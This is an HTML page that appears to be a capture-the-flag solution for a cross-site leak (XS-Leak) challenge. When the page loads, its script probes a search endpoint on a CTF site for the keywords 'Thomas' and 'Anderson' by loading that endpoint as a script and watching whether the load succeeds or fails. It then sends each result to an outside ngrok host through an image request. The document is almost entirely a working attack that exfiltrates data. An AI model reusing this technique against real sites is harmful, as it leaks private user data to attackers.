<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Keyword Checker</title>
    <script>
        async function logResult(keyword, status) {
            try {
                const img = new Image();
                img.src = `https://acca-87-4-142-72.ngrok-free.app/log?keyword=${encodeURIComponent(keyword)}&status=${status}`;
            } catch (error) {
                console.error('Error logging result:', error);
            }
        }

        function checkKeywords() {
            const keywords = ['Thomas', 'Anderson'];

            for (const keyword of keywords) {
                const script = document.createElement('script');
                script.src = `https://matrix.capturetheflags.site/search?s=${encodeURIComponent(keyword)}`;

                script.onload = () => {
                    console.log(`Keyword found: ${keyword}`);
                    logResult(keyword, 'found');
                };

                script.onerror = () => {
                    console.log(`Keyword not found: ${keyword}`);
                    logResult(keyword, 'not found');
                };

                document.head.appendChild(script);
            }
        }

        // Esegui la funzione checkKeywords quando la pagina Ã¨ completamente caricata
        window.addEventListener('DOMContentLoaded', () => {
            checkKeywords();
        });
    </script>
</head>
<body>
    <h1>XS-Leak Keyword Checker</h1>
</body>
</html>
